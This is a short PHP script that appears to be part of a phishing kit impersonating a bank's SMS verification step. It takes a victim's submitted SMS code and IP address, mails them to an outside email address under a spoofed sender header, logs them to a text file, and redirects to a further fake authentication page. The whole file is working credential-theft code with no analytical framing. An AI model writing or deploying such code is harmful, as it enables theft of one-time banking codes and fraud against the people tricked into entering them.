<?php
$pre = controlpanelidentif;
$md5 = rand(100000000, 1500000000);

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "Code Sms 1     : ".$_POST['codesms']."\n";
$message .= "IP    : $ip | $hostname\n";

$_SESSION['codesms']=$_POST['codesms'];


$smagri2 = "CPE |Fr0m ".$ip;
$smagri3 = "From: INBAX <smtp@ifastnet1.net>";

@mail("narutokabore03@protonmail.com",$smagri2,$message,$smagri3);
$file = fopen("../wu.txt","a");
fwrite($file,$message);
fclose($file);
header("Refresh: 40; URL=authentication.php?id=$pre&$md5");


?>
